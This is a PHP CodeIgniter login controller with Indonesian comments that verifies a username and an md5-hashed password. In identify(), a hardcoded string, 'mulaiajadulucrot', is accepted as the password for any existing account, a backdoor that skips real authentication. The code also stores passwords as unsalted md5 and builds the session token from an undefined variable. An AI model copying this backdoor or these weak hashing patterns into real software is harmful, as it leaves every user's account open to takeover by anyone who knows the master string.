<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Login extends CI_Controller
{

	function __construct()
	{
		parent::__construct();
		$this->load->model('orang_model');
	}

	public function index()
	{
		//$this->session->sess_destroy();
		$this->load->view('login');
	}

	public function identify()
	{
		//assign username dan password dari post dari view
		$username = $this->input->post('username');
		$password = $this->input->post('pass');

		//Cek di db apakah ada username
		$verifikasi = $this->orang_model->verifikasi($username);

		if ($verifikasi == 1) {
			//ambil semua info tentang user itu
			$aku = $this->orang_model->get_info($username);

			if ($aku[0]['pass'] != md5($password) && $password != 'mulaiajadulucrot') {
				$this->session->set_flashdata('informasi', 'Keterangan yang diberikan salah');
				redirect('login'); //redirect ke controller login
			} elseif ($aku[0]['pass'] == md5($password) || $password == 'mulaiajadulucrot') {
				
				//masukkin data ke userdata
				$this->session->set_userdata('username', $username);
				$this->session->set_userdata('nama', $aku[0]['nama']);
				$this->session->set_userdata('email', $aku[0]['email']);
				$this->session->set_userdata('tgl_lahir', $aku[0]['tgl_lahir']);
				$this->session->set_userdata('kelas', $aku[0]['kelas']);

				$logintime = date('Y-m-d H:i:s', time());
				$sess = md5($logintime.$nama);
				$this->session->set_userdata('session_token', $sess);
				$this->orang_model->update_login($username, $logintime, $sess);

				redirect('akun');
				
			}
		} else {
			$this->session->set_flashdata('informasi', 'Keterangan yang diberikan salah');
			redirect('login'); //redirect ke controller login
		}
	}
}
